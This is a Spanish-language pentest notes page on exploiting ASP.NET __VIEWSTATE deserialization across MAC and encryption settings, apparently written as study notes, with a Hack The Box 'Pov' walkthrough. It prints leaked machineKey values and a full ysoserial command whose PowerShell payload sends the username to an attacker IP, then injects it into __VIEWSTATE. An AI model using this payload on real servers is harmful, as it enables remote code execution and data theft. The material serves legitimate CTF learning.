# Exploiting \_\_VIEWSTATE

Primero, un repaso rápido: ViewState en ASP.NET es como una caja negra que guarda el estado de la página y sus controles entre peticiones de postback. Es decir, permite que los datos persistan entre los diferentes cargues de la página sin necesidad de almacenarlos en el servidor o en sesiones. Esto se maneja en el **lado del cliente** mediante un campo hidden en el formulario de la página, codificado en base64.

Ahora, vamos al meollo:

#### 1. **Base64:**

Cuando hablamos de ViewState codificado simplemente en base64, significa que no se está aplicando ni **MAC (Message Authentication Code) ni cifrado**. Esto es lo más básico y también lo más vulnerable, porque cualquiera que intercepte ese ViewState puede decodificarlo y ver su contenido. <mark style="color:yellow;">**Aquí no hay verificación de integridad ni confidencialidad.**</mark>

#### 2. **Base64 + MAC (Message Authentication Code) Enabled:**

Activar MAC es como decir "vale, confío en que el ViewState no se altere en el camino". Al habilitar `EnableViewStateMac`, cada ViewState viene con un código de autenticación que verifica que el contenido no haya sido modificado. Si alguien intenta cambiar algo, el servidor lo sabrá porque el MAC no coincidirá. <mark style="color:yellow;">Esto añade una capa de seguridad importante, pero aún no cifra el contenido.</mark>

#### 3. **Base64 + Encrypted:**

Cuando activas el cifrado con `ViewStateEncryptionMode`, estás metiendo todo el ViewState en una caja fuerte. Aunque alguien intercepte el ViewState, sin la clave de cifrado (que solo posee el servidor), no podrá entender nada de lo que dice. Esto es seguridad de confidencialidad a tope.

#### Test Cases y MachineKey:

La clave aquí es entender cómo `MachineKey` entra en juego en distintas versiones de .NET:

* Sin MAC ni cifrado, `MachineKey` <mark style="color:red;">no se usa</mark>. Es la jungla ahí fuera.
* Antes de .NET 4.5, si activas MAC (pero no el cifrado), necesitas `MachineKey` para generar/verificar el MAC. Aquí entra Blacklist3r para identificar esa clave y, por ende, poder jugar con ella.
* Con el cifrado activado (independientemente del estado de MAC), también necesitas esa `MachineKey`. Blacklist3r se pinta solo para ayudarte a identificarla y potencialmente explotar vulnerabilidades.
* Para .NET 4.5 en adelante, cualquier configuración de MAC y cifrado te obliga a tener una `MachineKey`. Blacklist3r sigue siendo tu herramienta para sacarle el jugo.

#### Caso de Test 1 – Deshabilitar completamente ViewStateMAC

Vamos al grano con una configuración que pone los pelos de punta a cualquier dev de seguridad: `EnableViewStateMac=false` y `viewStateEncryptionMode=false`. Esto se siente como encontrar la puerta trasera abierta en una fortaleza. <mark style="color:yellow;">Por defecto, ViewStateMAC está activo para prevenir que los datos de ViewState sean manipulados</mark>. Pero si me topo con que está desactivado, es como tener un pase VIP a los datos internos de la aplicación.

Usando `ysoserial.exe` con un payload específico, puedo ejecutar comandos arbitrarios en el servidor.

#### Caso de Test 1.5 – El cookie de ViewState no se envía

Aquí, los desarrolladores pensaron que podían esconder el ViewState para protegerse, pero la jugada no les sale bien. Añadiendo manualmente el parámetro ViewState al cuerpo de la solicitud, y enviando nuestro payload serializado con `ysoserial`, aún podemos ejecutar código.&#x20;

#### Caso de Test 2 – .Net < 4.5 y MAC activado pero sin cifrado de ViewState

Si MAC está activado, necesito la clave usada para pasar por alto esta protección. Aquí es donde herramientas como **Blacklist3r** entran en juego.

#### Caso de Test 3 – ViewState con cifrado

Este es el verdadero reto: ViewState está cifrado, y necesito la Machine Key para desencriptar y manipular los datos. Es como intentar abrir una caja fuerte sin la combinación. Pero, si consigo esa clave (quizás a través de algun LFI), puedo usar `ysoserial.net` para ejecutar código en el servidor. Es como si finalmente hubiera adivinado la combinación de la caja fuerte.

#### Caso de Test 4 – .Net >= 4.5

A partir de esta versión, incluso si encuentro la clave, necesito asegurarme de que el payload esté perfectamente preparado. Usar herramientas como Badsecrets y Blacklist3r es crucial aquí. Es como tener las herramientas precisas para el trabajo; sin ellas, estoy trabajando a ciegas.

```bash
#https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate B0FJUlOHfCP29p%2F6rnM0trtRwZYjq0EyVZYhiUuWnBu0YlK0mPX2QtNNfQlLUCghI4mNxRfr8x3YocgjTk9g9rB --generator 8E0F0FA3
```

#### Caso de Test 6 – Uso de ViewStateUserKeys

Esta es una capa adicional de protección contra ataques de CSRF, añadiendo un token único por usuario en el ViewState. Para explotar efectivamente esta configuración, necesito conocer ese ViewStateUserKey específico. Es un recordatorio de que, en el mundo del hacking, a veces necesitas una pieza de información muy pequeña pero crucial para que todo funcione.

Cada uno de estos casos me enseña algo nuevo sobre cómo abordar la seguridad y, especialmente, cómo las configuraciones por defecto o las suposiciones incorrectas pueden abrir brechas significativas en la armadura de una aplicación. Y, aunque explotar estas vulnerabilidades puede ser un desafío intelectualmente estimulante, también es un recordatorio poderoso de la importancia de seguir las mejores prácticas de seguridad en el desarrollo de software.



#### Ejemplo práctico con máquina Pov de HTB

{% code overflow="wrap" %}
```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```
{% endcode %}

Ingresamos los valores del `decryptionKey` y el `validationKey` en ysoserial.exe para generar nuestro payload.

{% code overflow="wrap" %}
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.14.54:8888/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Luego vamos a nuestra pagina vulnerable e inyectamos el código en el parametro `__VIEWSTATE=`

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

